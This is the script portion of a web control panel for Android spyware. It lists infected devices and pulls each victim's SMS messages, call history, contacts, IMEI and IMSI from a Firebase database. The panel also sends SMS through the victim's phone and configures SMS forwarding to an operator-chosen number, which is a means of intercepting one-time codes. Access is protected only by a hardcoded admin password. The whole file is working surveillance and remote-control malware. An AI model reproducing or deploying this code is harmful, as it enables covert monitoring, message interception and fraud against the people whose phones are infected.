        status:on?'online':'offline',battery:live.battery_level||0,network:live.network_type||'OFFLINE',
        charging:live.is_charging||false,lastSeen:live.timestamp_millis||info.last_seen||0,
        smsCount:d.all_sms?d.all_sms.total_count||0:0});
    });
    allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:b.lastSeen-a.lastSeen;});
    if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
    if(selDev&&!allDevs.find(function(d){return d.id===selDev;})) selDev=allDevs.length>0?allDevs[0].id:'';
    renderSidebar(); updateStats();
    if(selDev) openDevice(selDev);
  });
}

// ═══ RENDER SIDEBAR ═══
function renderSidebar(){
  var el=document.getElementById('devList'), q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=allDevs.filter(function(d){return !q||(d.name+d.id+d.brand).toLowerCase().includes(q);});
  if(!list.length){el.innerHTML='<div class="dev-no-data">// NO NODES FOUND</div>';return;}
  el.innerHTML=list.map(function(d){
    var bc=d.battery>50?'bat-high':d.battery>20?'bat-med':'bat-low';
    return '<div class="dev-item '+d.status+(d.id===selDev?' active':'')+'" onclick="openDevice(\''+d.id+'\')">'+
      '<div class="dev-item-top"><span class="dev-item-name">'+esc(d.name)+'</span><span class="dev-status-dot '+d.status+'"></span></div>'+
      '<div class="dev-item-id">'+esc(d.id.substring(0,18))+'...</div>'+
      '<div class="dev-item-meta">'+
        '<span class="dev-meta-chip '+bc+'">⚡'+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
        '<span class="dev-meta-chip">'+esc(d.network)+'</span>'+
        '<span class="dev-meta-chip">'+d.smsCount+' SMS</span>'+
      '</div></div>';
  }).join('');
}

function updateStats(){
  document.getElementById('stTotal').textContent=allDevs.length;
  document.getElementById('stOnline').textContent=allDevs.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=allDevs.filter(function(d){return d.status==='offline';}).length;
}

// ═══ OPEN DEVICE ═══
function openDevice(id){
  selDev=id;
  renderSidebar();
  document.getElementById('emptyState').classList.add('hidden');
  document.getElementById('deviceDetail').classList.remove('hidden');
  var dev=allDevs.find(function(d){return d.id===id;});
  if(dev) updateHero(dev);
  loadDeviceData(id);
}

function updateHero(d){
  document.getElementById('dName').textContent=d.name+(d.brand?' ('+d.brand+')':'');
  document.getElementById('dBrand').textContent='// Android '+d.android;
  document.getElementById('dId').textContent='NODE_ID: '+d.id;
  var st=document.getElementById('dStatusTag');
  st.className='status-tag '+(d.status);
  st.textContent=d.status==='online'?'● ONLINE':'○ OFFLINE';
  document.getElementById('dBat').textContent=d.battery+'%'+(d.charging?' ⚡':'');
  document.getElementById('dNet').textContent=d.network;
  document.getElementById('dAndroid').textContent=d.android;
  document.getElementById('dSmsCount').textContent=d.smsCount;
  var diff=Date.now()-d.lastSeen;
  document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
}

// ═══ LOAD DEVICE DATA ═══
function loadDeviceData(id){
  Object.keys(activeListeners).forEach(function(p){DB.ref(p).off('value',activeListeners[p]);});
  activeListeners={};
  var ref='devices/'+id;

  function on(path,cb){var fn=DB.ref(path).on('value',cb);activeListeners[path]=fn;}

  // SMS
  on(ref+'/all_sms',function(snap){
    var d=snap.val(), tb=document.getElementById('smsTbody');
    if(!d||!d.messages||!d.messages.length){tb.innerHTML='<tr><td colspan="5" class="table-empty">// NO SMS DATA — Grant READ_SMS permission</td></tr>';document.getElementById('tc-sms').textContent='0';return;}
    document.getElementById('tc-sms').textContent=d.total_count||d.messages.length;
    tb.innerHTML=d.messages.map(function(s,i){
      var t=s.type==='INBOX'?'badge-inbox':s.type==='SENT'?'badge-sent':'';
      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td><td class="mono" style="color:var(--accent2);font-weight:700">'+esc(s.address||'?')+'</td>'+
        '<td style="max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px">'+esc(s.body||'—')+'</td>'+
        '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
        '<td><span class="type-badge '+t+'">'+esc(s.type||'?')+'</span></td></tr>';
    }).join('');
  });

  // CALLS
  on(ref+'/all_calls',function(snap){
    var d=snap.val(), tb=document.getElementById('callsTbody');
    if(!d||!d.calls){tb.innerHTML='<tr><td colspan="6" class="table-empty">// NO CALL DATA</td></tr>';document.getElementById('tc-calls').textContent='0';return;}
    document.getElementById('tc-calls').textContent=d.total_count||d.calls.length;
    tb.innerHTML=d.calls.map(function(c,i){
      var t=c.type==='INCOMING'?'badge-incoming':c.type==='OUTGOING'?'badge-outgoing':c.type==='MISSED'?'badge-missed':'';
      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td><td class="mono" style="color:var(--accent2);font-weight:700">'+esc(c.number||'?')+'</td>'+
        '<td>'+esc(c.contact_name||'—')+'</td>'+
        '<td class="mono" style="color:var(--muted)">'+esc(c.date_readable||'—')+'</td>'+
        '<td class="mono">'+esc(c.duration||'0')+'s</td>'+
        '<td><span class="type-badge '+t+'">'+esc(c.type||'?')+'</span></td></tr>';
    }).join('');
  });

  // CONTACTS
  on(ref+'/all_contacts',function(snap){
    var d=snap.val(), tb=document.getElementById('contactsTbody');
    if(!d||!d.contacts){tb.innerHTML='<tr><td colspan="3" class="table-empty">// NO CONTACTS</td></tr>';document.getElementById('tc-contacts').textContent='0';return;}
    document.getElementById('tc-contacts').textContent=d.total_count||d.contacts.length;
    tb.innerHTML=d.contacts.map(function(c,i){
      return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
        '<td style="font-weight:600">'+esc(c.name||'UNKNOWN')+'</td>'+
        '<td class="mono" style="color:var(--accent2)">'+esc(c.phone||'—')+'</td></tr>';
    }).join('');
  });

  // SIM/IMEI
  on(ref+'/device_info/sim_info',function(snap){
    var s=snap.val(), g=document.getElementById('simGrid');
    if(!s){g.innerHTML='<div style="color:var(--muted);font-family:\'Share Tech Mono\',monospace;font-size:10px">// NO SIM DATA</div>';return;}
    var fields=[['SIM_OPERATOR',s.sim_operator_name],['NETWORK',s.network_operator_name],['IMEI',s.imei],['IMSI / SUBSCRIBER_ID',s.subscriber_id]];
    g.innerHTML='<div class="sim-card">'+fields.map(function(f){
      return '<div class="sim-field"><span class="sim-key">'+f[0]+'</span><span class="sim-val">'+(f[1]?'<span style="color:var(--accent3)">'+esc(f[1])+'</span>':'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
    }).join('')+'</div>';
  });

  // PERMS
  on(ref+'/live_data/permissions',function(snap){
    var p=snap.val(), g=document.getElementById('permGrid');
    if(!p){g.innerHTML='';return;}
    g.innerHTML=Object.entries(p).map(function(e){
      return '<div class="perm-item"><span class="perm-name">'+e[0].replace(/_/g,' ')+'</span>'+
        (e[1]?'<span class="perm-granted">✓ OK</span>':'<span class="perm-denied">✗ DENIED</span>')+'</div>';
    }).join('');
  });

  // SENT LOG
  on(ref+'/sent_sms',function(snap){
    var tb=document.getElementById('sentTbody'); if(!snap.exists()){tb.innerHTML='';return;}
    var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
    tb.innerHTML=l.map(function(r){
      return '<tr><td class="mono" style="color:var(--accent2)">'+esc(r.to||'?')+'</td>'+
        '<td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.message||'—')+'</td>'+
        '<td><span class="type-badge badge-incoming">SENT</span></td>'+
        '<td class="mono" style="color:var(--muted)">'+(r.sent_at?new Date(r.sent_at).toLocaleString():'—')+'</td></tr>';
    }).join('');
  });

  // FORWARDING SETTINGS
  on(ref+'/forwarding_settings',function(snap){
    var s=snap.val(); if(!s) return;
    document.getElementById('fwEnabled').checked=s.enabled||false;
    document.getElementById('fwTo').value=s.forward_to||'';
    document.getElementById('fwAll').checked=s.forward_all!==false;
    if(s.filters&&Array.isArray(s.filters)) document.getElementById('fwFilters').value=s.filters.join(', ');
    document.getElementById('fwFilterWrap').style.display=s.forward_all!==false?'none':'block';
  });

  // FORWARD LOG
  on(ref+'/forwarded_sms',function(snap){
    var tb=document.getElementById('fwTbody'); if(!snap.exists()){tb.innerHTML='';return;}
    var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
    tb.innerHTML=l.map(function(r){
      return '<tr><td class="mono" style="color:var(--accent2)">'+esc(r.from||'?')+'</td>'+
        '<td class="mono" style="color:var(--muted)">'+esc(r.to||'?')+'</td>'+
        '<td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.body||'—')+'</td>'+
        '<td class="mono" style="color:var(--muted)">'+(r.forwarded_at?new Date(r.forwarded_at).toLocaleString():'—')+'</td></tr>';
    }).join('');
  });
}

// ═══ DATA TABS ═══
function switchDataTab(name,btn){
  document.querySelectorAll('.data-tab').forEach(function(b){b.classList.remove('active');});
  btn.classList.add('active');
  document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
  document.getElementById('tab-'+name).classList.add('active');
}

// ═══ SEND SMS ═══
function sendSms(){
  if(!selDev){toast('err','// NO DEVICE SELECTED');return;}
  var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
  if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--danger)">// Fill all fields</span>';return;}
  DB.ref('devices/'+selDev+'/manual_commands/send_sms').push({to:n,message:m,timestamp:firebase.database.ServerValue.TIMESTAMP})
    .then(function(){document.getElementById('sendStatus').innerHTML='<span style="color:var(--accent3)">// COMMAND INJECTED ✓</span>';document.getElementById('sendMsg').value='';toast('ok','// SMS command sent to device');})
    .catch(function(e){document.getElementById('sendStatus').innerHTML='<span style="color:var(--danger)">// ERROR: '+e.message+'</span>';});
}

// ═══ FORWARDING ═══
function toggleFw(){if(!selDev)return;DB.ref('devices/'+selDev+'/forwarding_settings/enabled').set(document.getElementById('fwEnabled').checked);}
function saveFw(){
  if(!selDev){toast('err','// NO DEVICE SELECTED');return;}
  var filters=document.getElementById('fwFilters').value.split(',').map(function(f){return f.trim();}).filter(Boolean);
  DB.ref('devices/'+selDev+'/forwarding_settings').set({
    enabled:document.getElementById('fwEnabled').checked,
    forward_to:document.getElementById('fwTo').value.trim(),
    forward_all:document.getElementById('fwAll').checked,
    filters:filters,
    updated_at:firebase.database.ServerValue.TIMESTAMP
  },function(e){e?toast('err','// SAVE FAILED'):toast('ok','// CONFIG SAVED ✓');});
}

// ═══ HELPERS ═══
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function filterRows(id,q){q=q.toLowerCase();document.querySelectorAll('#'+id+' tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':' none';});}
function toast(t,m){var c=document.getElementById('toastWrap'),d=document.createElement('div');d.className='toast '+t;d.textContent=m;c.appendChild(d);setTimeout(function(){d.classList.add('out');setTimeout(function(){d.remove();},200);},2800);}

// ═══ LOGIN ═══
var AU='admin',AP='rebel2024';
(function(){var s=null;try{s=JSON.parse(localStorage.getItem('rbl'));}catch(e){}if(s&&s.u){document.getElementById('loginUser').value=s.u;document.getElementById('loginPass').value=s.p;document.getElementById('rememberMe').checked=true;}})();
function doLogin(){
  var u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value;
  if(u===AU&&p===AP){if(document.getElementById('rememberMe').checked)localStorage.setItem('rbl',JSON.stringify({u:u,p:p}));else localStorage.removeItem('rbl');document.getElementById('loginErr').style.display='none';document.getElementById('loginPage').classList.add('hidden');}
  else{document.getElementById('loginErr').style.display='block';document.getElementById('loginPass').value='';}
}
function doLogout(){localStorage.removeItem('rbl');location.reload();}
document.addEventListener('keydown',function(e){if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter')doLogin();});
setInterval(function(){document.getElementById('footerClock').textContent='// '+new Date().toLocaleString();},1000);
</script>
</body>
</html>
